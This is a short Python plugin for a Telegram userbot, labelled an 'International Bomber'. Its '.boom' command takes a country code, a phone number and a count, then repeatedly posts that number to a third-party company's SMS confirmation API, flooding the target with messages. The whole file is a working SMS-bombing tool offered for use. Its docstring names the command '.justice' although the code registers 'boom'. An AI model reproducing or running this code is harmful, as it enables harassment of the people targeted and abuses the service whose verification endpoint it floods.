"""International Bomber Plugin By @Ze_Falcon
Format .justice [country code ] [number] [amount]"""
import asyncio
import json
import requests
from userbot.utils import admin_cmd
from requests.structures import CaseInsensitiveDict
@borg.on(admin_cmd("boom (.*)"))
async def _(event):
    url = "https://hello.co/webback/services/api/v1/confirmation/sms/send"
    num=0
    n=0
    input_str = event.pattern_match.group(1)
    if input_str:
        a = input_str
        b = a.split(' ')
        num = b[1].split(' ')[0]
        cn = b[0].split('.')[0]
        am = b[2].split('.')[0]
        pldn = f"+{cn}{num}"
    else:
        await event.edit("Enter a number!")
        return

    await event.edit("`Bombing....`")
    for i  in range (1, int(am)+1): 
    

        headers = CaseInsensitiveDict()
        headers["Content-Type"] = "application/json"

        sed = {"phone":f"{pldn}"}


        resp = requests.post(url, headers=headers, data=json.dumps(sed))
        await event.edit(f"`Bombing.... {i}`")
        
    await event.edit(f"`Bombed {am} SMS to {pldn}`")
